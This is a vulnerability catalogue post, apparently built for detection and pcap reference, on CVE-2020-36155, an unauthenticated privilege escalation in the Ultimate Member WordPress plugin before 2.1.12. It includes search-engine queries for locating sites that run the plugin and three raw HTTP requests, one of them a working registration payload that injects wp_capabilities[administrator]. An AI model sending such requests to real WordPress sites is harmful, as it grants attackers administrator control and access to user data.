---
layout: post
cve_id: CVE-2020-36155
title: Ultimate Member < 2.1.12 - Unauthenticated Privilege Escalation via User Meta
pcap: true
pcap_path: /pcaps/2020/CVE-2020-36155.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-36155.yaml
snort2_rule: N/A
snort3_rule: N/A
author: riteshs4hu
severity: critical
impact: 'Unauthenticated attackers can escalate privileges to administrator during
  registration, gaining complete control over the WordPress site and all user data.

  '
remediation: Fixed in 2.1.12
reference:
- https://wpscan.com/vulnerability/cf13b0f8-5815-4d27-a276-5eff8985fc0b/
- https://nvd.nist.gov/vuln/detail/CVE-2020-36155
- https://wordpress.org/plugins/ultimate-member/#developers
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2020-36155
  cwe-id: CWE-269
  epss-score: 0.61437
  epss-percentile: 0.9825
  cpe: cpe:2.3:a:ultimatemember:ultimate_member:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 3
  verified: true
  vendor: ultimatemember
  product: ultimate_member
  framework: wordpress
  publicwww-query: /wp-content/plugins/ultimate-member
  fofa-query: body="/wp-content/plugins/ultimate-member"
  shodan-query: http.html:/wp-content/plugins/ultimate-member/
tags:
- cve
- cve2020
- wordpress
- wp-plugin
- wp
- wpscan
- ultimate-member
- intrusive
- privesc
- vkev
- vuln
---

## ðŸ” Vulnerability Description
An issue was discovered in the Ultimate Member plugin before 2.1.12 for WordPress, aka Unauthenticated Privilege Escalation via User Meta. An attacker could supply an array parameter for sensitive metadata, such as the wp_capabilities user meta that defines a user's role. During the registration process, submitted registration details were passed to the update_profile function, and any metadata was accepted, e.g., wp_capabilities[administrator] for Administrator access.


## ðŸŒ HTTP Request
```nohighlight
GET /register/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /register HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Length: 299
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
user_login-VPbv6S=pavwi&first_name-VPbv6S=CUbEu&last_name-VPbv6S=HCdwb&user_email-VPbv6S=bpWHIi@BWbcO.com&user_password-VPbv6S=8bpwtszG&confirm_user_password-VPbv6S=8bpwtszG&wp_capabilities%5Badministrator%5D=&form_id=VPbv6S&timestamp=1768394637&um_request=&_wpnonce=eh4g60&_wp_http_referer=register
```

```nohighlight
GET /wp-admin/users.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

